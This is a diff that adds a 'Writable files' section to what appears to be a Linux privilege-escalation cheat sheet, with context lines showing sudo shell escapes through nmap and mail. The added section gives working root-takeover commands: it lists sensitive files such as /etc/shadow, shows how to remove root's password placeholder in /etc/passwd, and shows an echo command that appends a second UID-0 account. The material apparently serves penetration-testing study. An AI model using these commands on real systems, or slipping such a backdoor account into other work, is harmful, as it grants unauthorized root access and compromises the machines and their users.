@@ -52,6 +52,28 @@ nmap>!sh
 sudo mail --exec='!/bin/bash'
 ```
 
+## Writable files
+```
+➤ Read/write sensitive files
+/etc/passwd
+/etc/group
+/etc/profile
+/etc/shadow
+
+➤ Detect if the file is writable
+ls -l /etc/passwd
+-rwxrwxrwx. 1 root root 1306 Jan 10 21:30 /etc/passwd
+
+➤ Privesc 01 : Delete the x of the root user in /etc/password
+• By deleting the 'x', all users can substitute the root user. 
+root:x:0:0:root:/root:/bin/bash
+->
+root::0:0:root:/root:/bin/bash
+
+➤  Privesc 02 : Add another root user in /etc/password
+echo "lexis:x:0:0:test:/root:/bin/bash" >> /etc/passwd
+```
+
 ## Crontab - Privesc
 
 ## DirtyCow
